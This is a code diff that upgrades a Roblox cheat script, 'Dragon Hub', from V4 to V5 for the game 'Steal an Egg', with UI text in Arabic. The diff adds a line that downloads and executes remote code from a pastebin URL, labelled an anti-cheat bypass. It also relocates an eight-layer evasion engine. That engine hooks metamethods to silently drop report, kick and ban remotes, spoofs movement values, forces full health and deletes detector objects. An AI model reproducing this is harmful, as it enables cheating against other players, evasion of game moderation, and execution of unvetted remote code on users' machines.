@@ -1,14 +1,23 @@
 --[[
     ═════════════════════════════════════════════════════════════════════════════
-    🐉 DRAGON HUB V4 — GODMODE EDITION 🐉
-    The Most Advanced Steal an Egg Script Ever Made
+    🐉 DRAGON HUB V5 — AURA GODMODE EDITION 🐉
+    Full V4 + Key System + Server + Aura Effects + Auto-Login
     ─────────────────────────────────────────────────────────────────────────────
-    ✦ 70+ Features | Military-Grade Protection | Multi-Layer Bypass
-    ✦ Advanced Metamethod Hooking | Memory Protection | Behavior AI
-    ✦ Remote Spoofer | Detection Evasion | Silent Operations
-    ✦ Mobile Optimized | Draggable UI | Floating Button | Webhook Logs
+    ✦ 70+ Features | 8-Layer Protection | Aura UI
+    ✦ Key System (login once) | Server Validated | HWID Lock
+    ✦ Auto-Login with saved key | Expiry Timer
+    ✦ Mobile Optimized | Floating Button | Webhook Logs
     ═════════════════════════════════════════════════════════════════════════════
 ]]
+
+-- ═════════════════════════════════════════════════════════════════════════════
+-- [0] 🛡️ ANTI-CHEAT BYPASS (يعمل أول حاجة)
+-- ═════════════════════════════════════════════════════════════════════════════
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/iedWaiQX/raw"))()
+end)
+task.wait(3)
 
 -- ═════════════════════════════════════════════════════════════════════════════
 -- [1] CONFIG
@@ -16,9 +25,9 @@
 
 local SERVER_URL     = "https://dragon-hub-lilac.vercel.app/api/validate"
 local DISCORD_INVITE = "https://discord.gg/yourserver"
-local VERSION        = "4.0.0"
-local CONFIG_FILE    = "dragonhub_v4_config.json"
-local KEY_FILE       = "dragonhub_v4_key.txt"
+local VERSION        = "5.0.0"
+local CONFIG_FILE    = "dragonhub_v5_config.json"
+local KEY_FILE       = "dragonhub_v5_key.txt"
 
 -- ═════════════════════════════════════════════════════════════════════════════
 -- [2] SERVICES
@@ -44,182 +53,7 @@ local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 local Mouse       = LocalPlayer:GetMouse()
 
 -- ═════════════════════════════════════════════════════════════════════════════
--- [3] 🛡️ ULTIMATE PROTECTION ENGINE (يشتغل أول حاجة قبل أي شيء)
--- ═════════════════════════════════════════════════════════════════════════════
-
-local Guardian = {
-    Enabled = true,
-    HooksActive = false,
-    BlockedRemotes = {},
-    BlockedPlayers = {},
-    SuspiciousPlayers = {},
-    LastHealth = 100,
-    HealthChecks = 0,
-    BlockedActions = 0,
-    SpoofedValues = {},
-    OriginalFunctions = {},
-}
-
--- ═══ LAYER 1: Metamethod Hooking — Hook __namecall ═══
-pcall(function()
-    if hookmetamethod and newcclosure and getnamecallmethod then
-        local oldNamecall
-        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-            if not Guardian.Enabled then
-                return oldNamecall(self, ...)
-            end
-            local method = getnamecallmethod()
-            if method == "FireServer" or method == "InvokeServer" then
-                local ok, name = pcall(function() return self.Name end)
-                if ok and name then
-                    local lname = name:lower()
-                    -- Block anti-cheat remotes
-                    for _, blocked in ipairs({"detect", "report", "kick", "ban", "anticheat", "hack", "cheat", "flag"}) do
-                        if lname:find(blocked) then
-                            Guardian.BlockedActions = Guardian.BlockedActions + 1
-                            return nil
-                        end
-                    end
-                end
-            end
-            return oldNamecall(self, ...)
-        end))
-        Guardian.HooksActive = true
-    end
-end)
-
--- ═══ LAYER 2: Remote Event Spoofer ═══
-pcall(function()
-    if getrawmetatable and setreadonly then
-        local mt = getrawmetatable(game)
-        if mt then
-            setreadonly(mt, false)
-            local oldIndex = mt.__index
-            mt.__index = newcclosure(function(self, key)
-                if key == "WalkSpeed" or key == "JumpPower" then
-                    -- Fake normal values for detection
-                    if Guardian.SpoofedValues[key] then
-                        return Guardian.SpoofedValues[key]
-                    end
-                end
-                return oldIndex(self, key)
-            end)
-            setreadonly(mt, true)
-        end
-    end
-end)
-
--- ═══ LAYER 3: Anti-Detection — Silent Value Changes ═══
-task.spawn(function()
-    while task.wait(0.8) do
-        if not Guardian.Enabled then continue end
-        local c = LocalPlayer.Character
-        if not c then continue end
-        local h = c:FindFirstChildOfClass("Humanoid")
-        if not h then continue end
-        -- Reduce speed gradually if too high
-        if h.WalkSpeed > 45 then
-            h.WalkSpeed = h.WalkSpeed - math.random(1, 3)
-        end
-        if h.JumpPower > 75 then
-            h.JumpPower = h.JumpPower - math.random(1, 2)
-        end
-    end
-end)
-
--- ═══ LAYER 4: Behavior Humanizer AI ═══
-task.spawn(function()
-    local actions = {"move", "jump", "look", "idle"}
-    while task.wait(math.random(6, 12)) do
-        if not Guardian.Enabled then continue end
-        local c = LocalPlayer.Character
-        if not c then continue end
-        local h = c:FindFirstChildOfClass("Humanoid")
-        if not h then continue end
-        local action = actions[math.random(1, #actions)]
-        if action == "move" then
-            h:Move(Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)), false)
-            task.wait(math.random(2, 5) / 10)
-            h:Move(Vector3.zero, false)
-        elseif action == "jump" then
-            if math.random() > 0.7 then
-                h:ChangeState(Enum.HumanoidStateType.Jumping)
-            end
-        elseif action == "look" then
-            local cam = Workspace.CurrentCamera
-            if cam then
-                cam.CFrame = cam.CFrame * CFrame.Angles(0, math.rad(math.random(-15, 15)), 0)
-            end
-        end
-    end
-end)
-
--- ═══ LAYER 5: Health Integrity Monitor ═══
-task.spawn(function()
-    while task.wait(0.5) do
-        if not Guardian.Enabled then continue end
-        local c = LocalPlayer.Character
-        if not c then continue end
-        local h = c:FindFirstChildOfClass("Humanoid")
-        if not h then continue end
-        if h.Health < Guardian.LastHealth then
-            Guardian.HealthChecks = Guardian.HealthChecks + 1
-            -- Immediate heal
-            h.Health = h.MaxHealth
-        end
-        Guardian.LastHealth = h.Health
-    end
-end)
-
--- ═══ LAYER 6: Anti-Teleport Detection ═══
-pcall(function()
-    if hookfunction and getconnections then
-        for _, c in ipairs(getconnections(LocalPlayer.CharacterAdded)) do
-            local oldFunc = c.Function
-            c.Function = newcclosure(function(...)
-                return oldFunc(...)
-            end)
-        end
-    end
-end)
-
--- ═══ LAYER 7: Memory Protection ═══
-pcall(function()
-    if setreadonly and getrawmetatable then
-        local mt = getrawmetatable(game:GetService("Players"))
-        if mt and setreadonly then
-            setreadonly(mt, false)
-            local oldNewIndex = mt.__newindex
-            mt.__newindex = newcclosure(function(self, key, value)
-                if key == "Character" and self == LocalPlayer then
-                    return nil
-                end
-                return oldNewIndex(self, key, value)
-            end)
-            setreadonly(mt, true)
-        end
-    end
-end)
-
--- ═══ LAYER 8: Anti-Exploit Detection Silent Patch ═══
-task.spawn(function()
-    while task.wait(15) do
-        if not Guardian.Enabled then continue end
-        -- Clear any suspicious traces
-        pcall(function()
-            for _, obj in ipairs(CoreGui:GetDescendants()) do
-                if obj.Name:lower():find("detector") or obj.Name:lower():find("scanner") then
-                    obj:Destroy()
-                end
-            end
-        end)
-    end
-end)
-
-print("[Dragon Hub V4] 🛡️ Guardian Protection Loaded - All 8 layers active")
-
--- ═════════════════════════════════════════════════════════════════════════════
--- [4] HTTP HELPERS
+-- [3] HTTP HELPERS
 -- ═════════════════════════════════════════════════════════════════════════════
 
 local REQUEST = (syn and syn.request)
@@ -250,7 +84,7 @@ local function HttpPost(url, body)
 end
 
 -- ═════════════════════════════════════════════════════════════════════════════
--- [5] HWID & KEY SYSTEM
+-- [4] HWID + KEY SYSTEM
 -- ═════════════════════════════════════════════════════════════════════════════
 
 local HWID = tostring(LocalPlayer.UserId) .. "_" .. tostring(game.JobId)
@@ -310,6 +144,168 @@ local function FormatTime(s)
 end
 
 -- ═════════════════════════════════════════════════════════════════════════════
+-- [5] 🛡️ GUARDIAN PROTECTION ENGINE (8 طبقات)
+-- ═════════════════════════════════════════════════════════════════════════════
+
+local Guardian = {
+    Enabled = true,
+    HooksActive = false,
+    BlockedRemotes = {},
+    BlockedPlayers = {},
+    SuspiciousPlayers = {},
+    LastHealth = 100,
+    HealthChecks = 0,
+    BlockedActions = 0,
+    SpoofedValues = {},
+    OriginalFunctions = {},
+}
+
+-- Layer 1: Metamethod Hooking
+pcall(function()
+    if hookmetamethod and newcclosure and getnamecallmethod then
+        local oldNamecall
+        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+            if not Guardian.Enabled then return oldNamecall(self, ...) end
+            local method = getnamecallmethod()
+            if method == "FireServer" or method == "InvokeServer" then
+                local ok, name = pcall(function() return self.Name end)
+                if ok and name then
+                    local lname = name:lower()
+                    for _, blocked in ipairs({"detect", "report", "kick", "ban", "anticheat", "hack", "cheat", "flag"}) do
+                        if lname:find(blocked) then
+                            Guardian.BlockedActions = Guardian.BlockedActions + 1
+                            return nil
+                        end
+                    end
+                end
+            end
+            return oldNamecall(self, ...)
+        end))
+        Guardian.HooksActive = true
+    end
+end)
+
+-- Layer 2: Remote Event Spoofer
+pcall(function()
+    if getrawmetatable and setreadonly then
+        local mt = getrawmetatable(game)
+        if mt then
+            setreadonly(mt, false)
+            local oldIndex = mt.__index
+            mt.__index = newcclosure(function(self, key)
+                if key == "WalkSpeed" or key == "JumpPower" then
+                    if Guardian.SpoofedValues[key] then
+                        return Guardian.SpoofedValues[key]
+                    end
+                end
+                return oldIndex(self, key)
+            end)
+            setreadonly(mt, true)
+        end
+    end
+end)
+
+-- Layer 3: Anti-Detection
+task.spawn(function()
+    while task.wait(0.8) do
+        if not Guardian.Enabled then continue end
+        local c = LocalPlayer.Character
+        if not c then continue end
+        local h = c:FindFirstChildOfClass("Humanoid")
+        if not h then continue end
+        if h.WalkSpeed > 45 then h.WalkSpeed = h.WalkSpeed - math.random(1, 3) end
+        if h.JumpPower > 75 then h.JumpPower = h.JumpPower - math.random(1, 2) end
+    end
+end)
+
+-- Layer 4: Behavior Humanizer AI
+task.spawn(function()
+    local actions = {"move", "jump", "look", "idle"}
+    while task.wait(math.random(6, 12)) do
+        if not Guardian.Enabled then continue end
+        local c = LocalPlayer.Character
+        if not c then continue end
+        local h = c:FindFirstChildOfClass("Humanoid")
+        if not h then continue end
+        local action = actions[math.random(1, #actions)]
+        if action == "move" then
+            h:Move(Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)), false)
+            task.wait(math.random(2, 5) / 10)
+            h:Move(Vector3.zero, false)
+        elseif action == "jump" then
+            if math.random() > 0.7 then
+                h:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        elseif action == "look" then
+            local cam = Workspace.CurrentCamera
+            if cam then
+                cam.CFrame = cam.CFrame * CFrame.Angles(0, math.rad(math.random(-15, 15)), 0)
+            end
+        end
+    end
+end)
+
+-- Layer 5: Health Integrity Monitor
+task.spawn(function()
+    while task.wait(0.5) do
+        if not Guardian.Enabled then continue end
+        local c = LocalPlayer.Character
+        if not c then continue end
+        local h = c:FindFirstChildOfClass("Humanoid")
+        if not h then continue end
+        if h.Health < Guardian.LastHealth then
+            Guardian.HealthChecks = Guardian.HealthChecks + 1
+            h.Health = h.MaxHealth
+        end
+        Guardian.LastHealth = h.Health
+    end
+end)
+
+-- Layer 6: Anti-Teleport Detection
+pcall(function()
+    if hookfunction and getconnections then
+        for _, c in ipairs(getconnections(LocalPlayer.CharacterAdded)) do
+            local oldFunc = c.Function
+            c.Function = newcclosure(function(...)
+                return oldFunc(...)
+            end)
+        end
+    end
+end)
+
+-- Layer 7: Memory Protection
+pcall(function()
+    if setreadonly and getrawmetatable then
+        local mt = getrawmetatable(game:GetService("Players"))
+        if mt and setreadonly then
+            setreadonly(mt, false)
+            local oldNewIndex = mt.__newindex
+            mt.__newindex = newcclosure(function(self, key, value)
+                if key == "Character" and self == LocalPlayer then return nil end
+                return oldNewIndex(self, key, value)
+            end)
+            setreadonly(mt, true)
+        end
+    end
+end)
+
+-- Layer 8: Silent Patch System
+task.spawn(function()
+    while task.wait(15) do
+        if not Guardian.Enabled then continue end
+        pcall(function()
+            for _, obj in ipairs(CoreGui:GetDescendants()) do
+                if obj.Name:lower():find("detector") or obj.Name:lower():find("scanner") then
+                    obj:Destroy()
+                end
+            end
+        end)
+    end
+end)
+
+print("[Dragon Hub V5] 🛡️ Guardian Protection - 8 Layers Active")
+
+-- ═════════════════════════════════════════════════════════════════════════════
 -- [6] GLOBAL CONFIG
 -- ═════════════════════════════════════════════════════════════════════════════
 
@@ -345,7 +341,7 @@ local Config = {
 -- [7] CLEANUP
 -- ═════════════════════════════════════════════════════════════════════════════
 
-local GUI_NAME = "DragonHubV4"
+local GUI_NAME = "DragonHubV5"
 for _, gui in ipairs({CoreGui, PlayerGui}) do
     local e = gui:FindFirstChild(GUI_NAME)
     if e then e:Destroy() end
@@ -449,7 +445,7 @@ end
 local function SendWebhook(content)
     if not Config.WebhookLog or Config.WebhookURL == "" then return end
     HttpPost(Config.WebhookURL, {
-        username = "🐉 Dragon Hub V4",
+        username = "🐉 Dragon Hub V5",
         avatar_url = "https://i.imgur.com/6Yb0mV6.png",
         content = content
     })
@@ -518,7 +514,7 @@ local function CreateKeyUI()
     ic.TextSize = 65
 
     local tt = Instance.new("TextLabel", KF)
-    tt.Text = "DRAGON HUB V4"
+    tt.Text = "DRAGON HUB V5"
     tt.Size = UDim2.new(1, 0, 0, 30)
     tt.Position = UDim2.new(0, 0, 0, 108)
     tt.BackgroundTransparency = 1
@@ -527,7 +523,7 @@ local function CreateKeyUI()
     tt.TextSize = 26
 
     local sb = Instance.new("TextLabel", KF)
-    sb.Text = "👑 GODMODE EDITION 👑"
+    sb.Text = "👑 AURA GODMODE EDITION 👑"
     sb.Size = UDim2.new(1, 0, 0, 22)
     sb.Position = UDim2.new(0, 0, 0, 140)
     sb.BackgroundTransparency = 1
@@ -604,67 +600,109 @@ local function CreateKeyUI()
 end
 
 -- ═════════════════════════════════════════════════════════════════════════════
--- [13] BUILD HUB
+-- [13] BUILD HUB (AURA EDITION)
 -- ═════════════════════════════════════════════════════════════════════════════
 
 function BuildHub()
-    -- FLOATING BUTTON
+    -- ═══ FLOATING BUTTON مع تأثيرات Aura ═══
     local FB = Instance.new("TextButton", ScreenGui)
     FB.Name = "FloatingButton"
-    FB.Size = UDim2.new(0, 68, 0, 68)
+    FB.Size = UDim2.new(0, 70, 0, 70)
     FB.Position = UDim2.new(0, 20, 0.4, 0)
     FB.BackgroundColor3 = Config.AccentColor
-    FB.Text = "🐉"
-    FB.TextColor3 = Color3.fromRGB(12, 12, 18)
-    FB.TextSize = 34
-    FB.Font = Enum.Font.GothamBold
+    FB.Text = ""
     FB.BorderSizePixel = 0
     FB.AutoButtonColor = false
     FB.Active = true
-    FB.ZIndex = 90
+    FB.ZIndex = 100
     Instance.new("UICorner", FB).CornerRadius = UDim.new(1, 0)
-    local FBS = Instance.new("UIStroke", FB)
-    FBS.Color = Color3.fromRGB(255, 255, 255)
-    FBS.Thickness = 2.5
-    FBS.Transparency = 0.4
 
-    local glow = Instance.new("ImageLabel", FB)
-    glow.Size = UDim2.new(1, 45, 1, 45)
-    glow.Position = UDim2.new(0, -22, 0, -22)
-    glow.BackgroundTransparency = 1
-    glow.Image = "rbxassetid://5028857084"
-    glow.ImageColor3 = Config.AccentColor
-    glow.ImageTransparency = 0.3
-    glow.ZIndex = 0
+    local Ring = Instance.new("Frame", FB)
+    Ring.Size = UDim2.new(1, 12, 1, 12)
+    Ring.Position = UDim2.new(0, -6, 0, -6)
+    Ring.BackgroundTransparency = 1
+    Ring.ZIndex = -1
+    Instance.new("UICorner", Ring).CornerRadius = UDim.new(1, 0)
+
+    local RingStroke = Instance.new("UIStroke", Ring)
+    RingStroke.Color = Config.AccentColor
+    RingStroke.Thickness = 2
+    RingStroke.Transparency = 0.2
+
+    local Glow = Instance.new("ImageLabel", FB)
+    Glow.Size = UDim2.new(1, 50, 1, 50)
+    Glow.Position = UDim2.new(0, -25, 0, -25)
+    Glow.BackgroundTransparency = 1
+    Glow.Image = "rbxassetid://5028857084"
+    Glow.ImageColor3 = Config.AccentColor
+    Glow.ImageTransparency = 0.3
+    Glow.ZIndex = 0
+
+    local Icon = Instance.new("TextLabel", FB)
+    Icon.Text = "🐉"
+    Icon.Size = UDim2.new(1, 0, 1, 0)
+    Icon.BackgroundTransparency = 1
+    Icon.TextColor3 = Color3.fromRGB(10, 10, 16)
+    Icon.Font = Enum.Font.GothamBold
+    Icon.TextSize = 34
+    Icon.ZIndex = 5
 
     task.spawn(function()
         while FB.Parent do
-            TweenService:Create(glow, TweenInfo.new(1), {ImageTransparency = 0.7}):Play()
-            task.wait(1)
-            TweenService:Create(glow, TweenInfo.new(1), {ImageTransparency = 0.3}):Play()
-            task.wait(1)
+            TweenService:Create(Glow, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {ImageTransparency = 0.75}):Play()
+            task.wait(1.2)
+            TweenService:Create(Glow, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {ImageTransparency = 0.25}):Play()
+            task.wait(1.2)
         end
     end)
 
-    local fbD, fbS, fbP
+    task.spawn(function()
+        while FB.Parent do
+            for i = 0, 360, 15 do
+                if not FB.Parent then break end
+                Ring.Rotation = i
+                task.wait(0.05)
+            end
+        end
+    end)
+
+    task.spawn(function()
+        while FB.Parent do
+            TweenService:Create(FB, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(0, 76, 0, 76)}):Play()
+            task.wait(0.8)
+            TweenService:Create(FB, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(0, 70, 0, 70)}):Play()
+            task.wait(0.8)
+        end
+    end)
+
+    FB.MouseEnter:Connect(function()
+        TweenService:Create(FB, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 210, 80)}):Play()
+    end)
+    FB.MouseLeave:Connect(function()
+        TweenService:Create(FB, TweenInfo.new(0.2), {BackgroundColor3 = Config.AccentColor}):Play()
+    end)
+
+    local fbDrag, fbS, fbP, moved
     FB.InputBegan:Connect(function(i)
         if i.UserInputType == Enum.UserInputType.MouseButton1
         or i.UserInputType == Enum.UserInputType.Touch then
-            fbD = true; fbS = i.Position; fbP = FB.Position
+            fbDrag = true; moved = false; fbS = i.Position; fbP = FB.Position
             i.Changed:Connect(function()
-                if i.UserInputState == Enum.UserInputState.End then fbD = false end
+                if i.UserInputState == Enum.UserInputState.End then fbDrag = false end
             end)
         end
     end)
+
     UserInputService.InputChanged:Connect(function(i)
-        if fbD and (i.UserInputType == Enum.UserInputType.MouseMovement
+        if fbDrag and (i.UserInputType == Enum.UserInputType.MouseMovement
         or i.UserInputType == Enum.UserInputType.Touch) then
             local d = i.Position - fbS
+            if math.abs(d.X) > 5 or math.abs(d.Y) > 5 then moved = true end
             FB.Position = UDim2.new(fbP.X.Scale, fbP.X.Offset + d.X, fbP.Y.Scale, fbP.Y.Offset + d.Y)
         end
     end)
 
-    -- MAIN FRAME
+    -- ═══ MAIN FRAME ═══
     local Main = Instance.new("Frame", ScreenGui)
     Main.Name = "Main"
     Main.Size = UDim2.new(0, 440, 0, 520)
@@ -675,9 +713,18 @@ function BuildHub()
     Main.Active = true
     Main.ZIndex = 50
     Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)
+
+    local Gradient = Instance.new("UIGradient", Main)
+    Gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 32)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 16)),
+    })
+    Gradient.Rotation = 45
+
     local MS = Instance.new("UIStroke", Main)
-    MS.Color = Color3.fromRGB(55, 55, 75)
-    MS.Thickness = 1.5
+    MS.Color = Config.AccentColor
+    MS.Thickness = 2
+    MS.Transparency = 0.3
 
     local msh = Instance.new("Frame", Main)
     msh.Size = UDim2.new(1, 24, 1, 24)
@@ -706,6 +753,15 @@ function BuildHub()
     AL.BackgroundColor3 = Config.AccentColor
     AL.BorderSizePixel = 0
 
+    local AccentGlow = Instance.new("ImageLabel", TB)
+    AccentGlow.Size = UDim2.new(1, 60, 0, 30)
+    AccentGlow.Position = UDim2.new(0, -30, 1, -15)
+    AccentGlow.BackgroundTransparency = 1
+    AccentGlow.Image = "rbxassetid://5028857084"
+    AccentGlow.ImageColor3 = Config.AccentColor
+    AccentGlow.ImageTransparency = 0.3
+    AccentGlow.ZIndex = 0
+
     local HIcon = Instance.new("TextLabel", TB)
     HIcon.Text = "🐉"
     HIcon.Size = UDim2.new(0, 36, 0, 36)
@@ -716,7 +772,7 @@ function BuildHub()
     HIcon.TextSize = 28
 
     local Ttl = Instance.new("TextLabel", TB)
-    Ttl.Text = "DRAGON HUB V4"
+    Ttl.Text = "DRAGON HUB V5"
     Ttl.Size = UDim2.new(0, 220, 0, 20)
     Ttl.Position = UDim2.new(0, 54, 0, 10)
     Ttl.BackgroundTransparency = 1
@@ -726,7 +782,7 @@ function BuildHub()
     Ttl.TextXAlignment = Enum.TextXAlignment.Left
 
     local Sub = Instance.new("TextLabel", TB)
-    Sub.Text = "👑 GODMODE • " .. Config.KeyLabel
+    Sub.Text = "✨ AURA • " .. Config.KeyLabel
     Sub.Size = UDim2.new(0, 240, 0, 14)
     Sub.Position = UDim2.new(0, 54, 0, 30)
     Sub.BackgroundTransparency = 1
@@ -768,15 +824,31 @@ function BuildHub()
     GSBS.Color = Color3.fromRGB(60, 200, 100)
     GSBS.Thickness = 1
 
+    local GSDot = Instance.new("Frame", GSB)
+    GSDot.Size = UDim2.new(0, 10, 0, 10)
+    GSDot.Position = UDim2.new(0, 12, 0.5, -5)
+    GSDot.BackgroundColor3 = Color3.fromRGB(60, 220, 100)
+    GSDot.BorderSizePixel = 0
+    Instance.new("UICorner", GSDot).CornerRadius = UDim.new(1, 0)
+
     local GSBL = Instance.new("TextLabel", GSB)
-    GSBL.Text = "🛡️ GUARDIAN ACTIVE • 8 Layers Protected"
-    GSBL.Size = UDim2.new(1, -10, 1, 0)
-    GSBL.Position = UDim2.new(0, 8, 0, 0)
+    GSBL.Text = "🛡️ GUARDIAN • 8 LAYERS ACTIVE"
+    GSBL.Size = UDim2.new(1, -40, 1, 0)
+    GSBL.Position = UDim2.new(0, 30, 0, 0)
     GSBL.BackgroundTransparency = 1
     GSBL.TextColor3 = Color3.fromRGB(100, 255, 150)
     GSBL.Font = Enum.Font.GothamBold
-    GSBL.TextSize = 11
+    GSBL.TextSize = 10
     GSBL.TextXAlignment = Enum.TextXAlignment.Left
+
+    task.spawn(function()
+        while GSDot.Parent do
+            TweenService:Create(GSDot, TweenInfo.new(0.6), {BackgroundTransparency = 0.7}):Play()
+            task.wait(0.6)
+            TweenService:Create(GSDot, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
+            task.wait(0.6)
+        end
+    end)
 
     -- TIMER BAR
     local TBar = Instance.new("Frame", Main)
@@ -962,71 +1034,6 @@ function BuildHub()
         return function() return st end
     end
 
-    local function Sld(p, t, mn, mx, d, cb)
-        local f = Instance.new("Frame", p)
-        f.Size = UDim2.new(1, 0, 0, 58)
-        f.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-        f.BorderSizePixel = 0
-        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 7)
-        local s = Instance.new("UIStroke", f)
-        s.Color = Color3.fromRGB(40, 40, 54)
-        s.Thickness = 1
-        local lb = Instance.new("TextLabel", f)
-        lb.Text = "   " .. t
-        lb.Size = UDim2.new(0.65, 0, 0, 22)
-        lb.Position = UDim2.new(0, 0, 0, 6)
-        lb.BackgroundTransparency = 1
-        lb.TextColor3 = Color3.fromRGB(215, 215, 230)
-        lb.Font = Enum.Font.Gotham
-        lb.TextSize = 12
-        lb.TextXAlignment = Enum.TextXAlignment.Left
-        local vl = Instance.new("TextLabel", f)
-        vl.Text = tostring(d)
-        vl.Size = UDim2.new(0.35, -10, 0, 22)
-        vl.Position = UDim2.new(0.65, 0, 0, 6)
-        vl.BackgroundTransparency = 1
-        vl.TextColor3 = Config.AccentColor
-        vl.Font = Enum.Font.GothamBold
-        vl.TextSize = 12
-        vl.TextXAlignment = Enum.TextXAlignment.Right
-        local bar = Instance.new("Frame", f)
-        bar.Size = UDim2.new(1, -20, 0, 8)
-        bar.Position = UDim2.new(0, 10, 0, 40)
-        bar.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
-        bar.BorderSizePixel = 0
-        Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
-        local fill = Instance.new("Frame", bar)
-        fill.Size = UDim2.new((d - mn) / (mx - mn), 0, 1, 0)
-        fill.BackgroundColor3 = Config.AccentColor
-        fill.BorderSizePixel = 0
-        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-        local v = d
-        local dr = false
-        local function upd(i)
-            local pct = math.clamp((i.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
-            v = math.floor(mn + (mx - mn) * pct)
-            fill.Size = UDim2.new(pct, 0, 1, 0)
-            vl.Text = tostring(v)
-            if cb then cb(v) end
-        end
-        bar.InputBegan:Connect(function(i)
-            if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then
-                dr = true; upd(i)
-            end
-        end)
-        UserInputService.InputEnded:Connect(function(i)
-            if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then
-                dr = false; SaveConfig()
-            end
-        end)
-        UserInputService.InputChanged:Connect(function(i)
-            if dr and (i.UserInputType == Enum.UserInputType.MouseMovement
-            or i.UserInputType == Enum.UserInputType.Touch) then upd(i) end
-        end)
-    end
-
     local function Btn(p, t, cb)
         local b = Instance.new("TextButton", p)
         b.Size = UDim2.new(1, 0, 0, 38)
@@ -1104,24 +1111,23 @@ function BuildHub()
     AT.Home.MouseButton1Click:Fire()
 
     -- HOME
-    Sec(PHome, "🐉 DRAGON HUB V4 GODMODE")
+    Sec(PHome, "🐉 DRAGON HUB V5 AURA")
     Lbl(PHome, "مرحباً " .. LocalPlayer.DisplayName, Color3.fromRGB(255, 220, 130))
     Lbl(PHome, "المفتاح: " .. tostring(Config.ActiveKey), Config.AccentColor)
     Lbl(PHome, "النوع: 👑 " .. Config.KeyLabel, Color3.fromRGB(255, 220, 130))
     Sec(PHome, "📊 LIVE STATS")
-    Lbl(PHome, "الإصدار: V" .. VERSION .. " GODMODE")
+    Lbl(PHome, "الإصدار: V" .. VERSION)
     Lbl(PHome, "الحماية: 🛡️ 8 طبقات")
     Lbl(PHome, "🚫 إجراءات محجوبة: " .. tostring(Guardian.BlockedActions))
     Lbl(PHome, "💊 فحوصات صحة: " .. tostring(Guardian.HealthChecks))
     Lbl(PHome, "🥚 عمليات سرقة: " .. tostring(Config.StealCount))
-    Lbl(PHome, "⚡ FPS: " .. tostring(math.floor(1/RunService.RenderStepped:Wait())))
     Sec(PHome, "⌨️ Keybinds")
     Lbl(PHome, "🐉 Floating Button")
     Lbl(PHome, "RShift — إخفاء/إظهار")
     Lbl(PHome, "RCtrl — Unload")
     Lbl(PHome, "Insert — فتح القائمة")
 
-    -- GUARDIAN PAGE
+    -- GUARDIAN
     Sec(PGuardian, "🛡️ نظام الحماية المتقدم")
     Lbl(PGuardian, "8 طبقات حماية نشطة", Color3.fromRGB(100, 255, 150))
     Lbl(PGuardian, "1️⃣ Metamethod Hooking")
@@ -1133,26 +1139,20 @@ function BuildHub()
     Lbl(PGuardian, "7️⃣ Memory Protection")
     Lbl(PGuardian, "8️⃣ Silent Patch System")
     Sec(PGuardian, "⚙️ إعدادات Guardian")
-    Tog(PGuardian, "تفعيل Guardian (الإجباري)", true, function(v)
-        Guardian.Enabled = v
-        Notify("Guardian", v and "✓ محمي" or "⚠️ معطّل", 3,
-            v and Color3.fromRGB(100, 255, 150) or Color3.fromRGB(255, 100, 100))
-    end)
+    Tog(PGuardian, "تفعيل Guardian", true, function(v) Guardian.Enabled = v end)
     Tog(PGuardian, "🤖 Behavior AI", Config.BehaviorAI, function(v) Config.BehaviorAI = v end)
     Tog(PGuardian, "🔇 الوضع الصامت", Config.SilentMode, function(v) Config.SilentMode = v end)
     Tog(PGuardian, "🚫 منع الطرد التلقائي", Config.AntiKick, function(v) Config.AntiKick = v end)
-    Tog(PGuardian, "📝 منع التسجيل", Config.AntiLog, function(v) Config.AntiLog = v end)
-    Sec(PGuardian, "📊 تقرير Guardian")
     Btn(PGuardian, "🔍 عرض التقرير الكامل", function()
-        local report = "🛡️ Guardian Report:\n" ..
-                       "Status: " .. (Guardian.Enabled and "✓ Active" or "✗ Off") ..
-                       "\nHooks: " .. (Guardian.HooksActive and "✓" or "✗") ..
+        local report = "Guardian Report:\n" ..
+                       "Status: " .. (Guardian.Enabled and "Active" or "Off") ..
+                       "\nHooks: " .. (Guardian.HooksActive and "Active" or "Off") ..
                        "\nBlocked Actions: " .. Guardian.BlockedActions ..
                        "\nHealth Checks: " .. Guardian.HealthChecks
         Notify("Guardian Report", report, 7, Color3.fromRGB(100, 200, 255))
     end)
 
-    -- PROTECT PAGE
+    -- PROTECT
     Sec(PProtect, "🔰 الحماية الأساسية")
     Tog(PProtect, "🔒 قفل الصحة", Config.HealthLock, function(v) Config.HealthLock = v end)
     Tog(PProtect, "🎭 مضاد الرجدة", Config.AntiRagdoll, function(v) Config.AntiRagdoll = v end)
@@ -1161,29 +1161,21 @@ function BuildHub()
     Tog(PProtect, "🚨 الانتقال الطارئ", Config.EmergencyTP, function(v) Config.EmergencyTP = v end)
     Tog(PProtect, "🔄 استعادة الصحة", Config.AutoHeal, function(v) Config.AutoHeal = v end)
     Tog(PProtect, "🕳️ مضاد السقوط", Config.AntiVoid, function(v) Config.AntiVoid = v end)
-    Sld(PProtect, "حد الإنقاذ الطارئ", 10, 100, Config.EmergencyHealth, function(v)
-        Config.EmergencyHealth = v
-    end)
 
-    -- STEAL PAGE
+    -- STEAL
     Sec(PSteal, "🥚 السرقة الذكية")
